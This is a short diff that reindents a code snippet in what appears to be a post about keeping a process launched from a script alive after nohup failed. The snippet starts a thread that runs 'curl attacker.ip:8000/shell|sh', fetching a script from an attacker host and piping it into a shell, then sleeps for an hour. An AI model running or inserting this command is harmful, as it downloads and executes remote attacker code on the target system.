@@ -27,11 +27,9 @@ I tried using `nohup` without success. I *suspect* that the process launched fro
 
 ```java
 Thread thread = new Thread({
-
-  def command = ["sh","-c","curl attacker.ip:8000/shell|sh"]
-  command.execute()
-  sleep(3600000) // time in milliseconds, 1 hour in this case
-  
+    def command = ["sh","-c","curl attacker.ip:8000/shell|sh"]
+    command.execute()
+    sleep(3600000) // time in milliseconds, 1 hour in this case
 })
 
 thread.start()
